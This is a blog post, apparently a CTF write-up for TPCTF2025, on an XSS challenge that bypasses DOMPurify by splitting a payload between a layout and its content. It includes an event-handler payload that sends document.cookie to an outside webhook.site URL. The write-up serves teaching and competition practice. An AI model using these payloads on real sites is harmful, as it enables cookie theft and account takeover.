@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>TPCTF2025部分wp - 6s6&#39;s blog</title><meta name="author" content="6s6">
+<meta name="description" content="description is here"><meta name="keywords" content='CTF'>
+  <meta itemprop="name" content="TPCTF2025部分wp">
+  <meta itemprop="description" content="description is here">
+  <meta itemprop="datePublished" content="2025-03-11T22:11:59+08:00">
+  <meta itemprop="dateModified" content="2025-03-11T22:11:59+08:00">
+  <meta itemprop="wordCount" content="683">
+  <meta itemprop="keywords" content="CTF"><meta property="og:url" content="http://localhost:1313/posts/c1e7c5b/">
+  <meta property="og:site_name" content="6s6&#39;s blog">
+  <meta property="og:title" content="TPCTF2025部分wp">
+  <meta property="og:description" content="description is here">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-11T22:11:59+08:00">
+    <meta property="article:modified_time" content="2025-03-11T22:11:59+08:00">
+    <meta property="article:tag" content="CTF">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TPCTF2025部分wp">
+  <meta name="twitter:description" content="description is here">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/c1e7c5b/" title="TPCTF2025部分wp - 6s6&#39;s blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/48766ef/" title="SUCTF2025部分wp" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/c1e7c5b/index.md" title="TPCTF2025部分wp - 6s6's blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "TPCTF2025部分wp",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/c1e7c5b\/"
+    },"genre": "posts","keywords": "CTF","wordcount":  683 ,
+    "url": "http:\/\/localhost:1313\/posts\/c1e7c5b\/","datePublished": "2025-03-11T22:11:59+08:00","dateModified": "2025-03-11T22:11:59+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "6s6"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="6s6&#39;s blog"><span class="typeit"><template>6s6&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/" title="links">Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/">About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="6s6&#39;s blog"><span class="typeit"><template>6s6&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/">Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/" title="links">Links</a></li><li class="menu-item"><a class="menu-link" href="/about/">About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>TPCTF2025部分wp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://bu.dusays.com/2024/12/26/676d23907280d.jpg" alt="6s6" data-title="6s6" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;6s6</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/ctf/" class="post-category" title="分类 - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="发布于 2025-03-11 22:11:59"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-03-11">2025-03-11</time></span>&nbsp;<span title="683 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#baby-layout">baby layout</a></li>
+        <li><a href="#safe-layout">safe layout*</a></li>
+        <li><a href="#safe-layout-revenge">safe layout revenge*</a></li>
+        <li><a href="#supersqli">supersqli</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="前言" class="heading-element"><span>前言</span>
+  <a href="#%e5%89%8d%e8%a8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>清华北大办的比赛，质量不用质疑，Misc 的话手搓二维码的时候一直对不上，貌似是上下颠倒了，qrzybox原来还能自动补全，算是学到了，Web 的话就复现了下 xss 的，其他题看下 wp 再说吧，题目后打 <code>*</code> 的是复现</p>
+<h2 id="web" class="heading-element"><span>Web</span>
+  <a href="#web" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="baby-layout" class="heading-element"><span>baby layout</span>
+  <a href="#baby-layout" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>思路很清楚，可以写 content 和 layout ，然后bot访问指定 url 时会将 flag 注入到访问的的那个网页的 cookie 中，打 xss  带 cookie。可以看到代码中对 content 和 layout 的内容都是用 <code>DOMPurify.sanitize()</code> 来进行了个过滤，而且可以在配置文件中看到 dompurify 版本为 3.2.4，应该不是打 0day</p>
+<p>我们这里重点看下 content 和 layout 的实现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;/api/post&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="p">{</span> <span class="n">content</span><span class="p">,</span> <span class="n">layoutId</span> <span class="p">}</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">body</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nb">typeof</span> <span class="n">content</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="nb">typeof</span> <span class="n">layoutId</span> <span class="o">!==</span> <span class="s1">&#39;number&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;Invalid params&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">content</span><span class="o">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="n">LENGTH_LIMIT</span><span class="p">)</span> <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;Content too long&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="n">layout</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">layouts</span><span class="p">[</span><span class="n">layoutId</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">layout</span> <span class="o">===</span> <span class="n">undefined</span><span class="p">)</span> <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;Layout not found&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="n">sanitizedContent</span> <span class="o">=</span> <span class="n">DOMPurify</span><span class="o">.</span><span class="n">sanitize</span><span class="p">(</span><span class="n">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">//</span><span class="err">将</span> <span class="n">layout</span> <span class="err">中的</span> <span class="p">{{</span><span class="n">content</span><span class="p">}}</span> <span class="err">替换为</span> <span class="n">content</span> <span class="err">的值</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="n">body</span> <span class="o">=</span> <span class="n">layout</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/</span>\<span class="p">{</span>\<span class="p">{</span><span class="n">content</span>\<span class="p">}</span>\<span class="p">}</span><span class="o">/</span><span class="n">g</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="n">sanitizedContent</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">body</span><span class="o">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="n">LENGTH_LIMIT</span><span class="p">)</span> <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;Post too long&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="n">id</span> <span class="o">=</span> <span class="n">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">posts</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">body</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">req</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">posts</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="n">id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="err">`</span><span class="n">Post</span> <span class="o">$</span><span class="p">{</span><span class="n">id</span><span class="p">}</span> <span class="o">$</span><span class="p">{</span><span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">layout</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)}</span> <span class="o">$</span><span class="p">{</span><span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">sanitizedContent</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)}</span><span class="err">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">({</span> <span class="n">id</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;/api/layout&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="p">{</span> <span class="n">layout</span> <span class="p">}</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">body</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nb">typeof</span> <span class="n">layout</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;Invalid param&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">layout</span><span class="o">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="n">LENGTH_LIMIT</span><span class="p">)</span> <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;Layout too large&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="n">sanitizedLayout</span> <span class="o">=</span> <span class="n">DOMPurify</span><span class="o">.</span><span class="n">sanitize</span><span class="p">(</span><span class="n">layout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="n">id</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">layouts</span><span class="o">.</span><span class="n">length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">req</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">layouts</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="n">sanitizedLayout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">({</span> <span class="n">id</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到在 content 的实现中是先检测再替换，也就是说我们可以将 payload 分为两段，一段写入 layout ，并将会被过滤的部分替换为 {{content}}，第二段写入 content，值就为会被过滤的部分，这样的话 content 和 layout 都可以绕过 <code>DOMPurify.sanitize()</code> 的检测，而且也会将 content 的值拼入 layout 中，形成最后的恶意 payload。而之所以 content 的值不会被过滤，应该是没有形成一个完整的 html ，没被检测到，可以在官方的github 上找到个 demo 来测试一下：<a href="https://cure53.de/purify"target="_blank" rel="external nofollow noopener noreferrer">DOMPurify 3.2.4 &ldquo;Shipwreck&rdquo;</a></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451dab4cc.png" alt="image-20250308193105525" srcset="https://bu.dusays.com/2025/03/11/67d0451dab4cc.png?size=small, https://bu.dusays.com/2025/03/11/67d0451dab4cc.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451dab4cc.png?size=large 2x" data-title="image-20250308193105525" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451da9380.png" alt="image-20250308193135429" srcset="https://bu.dusays.com/2025/03/11/67d0451da9380.png?size=small, https://bu.dusays.com/2025/03/11/67d0451da9380.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451da9380.png?size=large 2x" data-title="image-20250308193135429" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>可以看到第二次就被过滤了而第一次却没有被过滤，弹个窗先</p>
+<p>layout 为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;audio src={{content}}&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>content 为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s2">&#34;a&#34;</span> <span class="n">onloadstart</span><span class="o">=</span><span class="s2">&#34;alert(1)&#34;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>create post 就弹窗了</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451dcbfb2.png" alt="image-20250308193538228" srcset="https://bu.dusays.com/2025/03/11/67d0451dcbfb2.png?size=small, https://bu.dusays.com/2025/03/11/67d0451dcbfb2.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451dcbfb2.png?size=large 2x" data-title="image-20250308193538228" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>源码也可以看到是成功插入了的</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451db28e8.png" alt="image-20250308193839895" srcset="https://bu.dusays.com/2025/03/11/67d0451db28e8.png?size=small, https://bu.dusays.com/2025/03/11/67d0451db28e8.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451db28e8.png?size=large 2x" data-title="image-20250308193839895" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>带下 cookie</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s2">&#34;a&#34;</span> <span class="n">onloadstart</span><span class="o">=</span><span class="s2">&#34;fetch(&#39;https://webhook.site/98df9897-f596-4e4b-9994-3ee26ff59249?f=&#39; + document.cookie)&#34;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451de841a.png" alt="image-20250308194217163" srcset="https://bu.dusays.com/2025/03/11/67d0451de841a.png?size=small, https://bu.dusays.com/2025/03/11/67d0451de841a.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451de841a.png?size=large 2x" data-title="image-20250308194217163" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>后面两道加强题都可以参考：https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists</p>
+<h3 id="safe-layout" class="heading-element"><span>safe layout*</span>
+  <a href="#safe-layout" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>加强了过滤</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451dcd13f.png" alt="image-20250309201717396" srcset="https://bu.dusays.com/2025/03/11/67d0451dcd13f.png?size=small, https://bu.dusays.com/2025/03/11/67d0451dcd13f.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451dcd13f.png?size=large 2x" data-title="image-20250309201717396" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>将 <code>ALLOWED_ATTR</code> 置为空，也就是不能引用属性，但跟进后会发现还可以用 <code>ALLOW_DATA_ATTR</code> 和 <code>ALLOW_ARIA_ATTR</code></p>
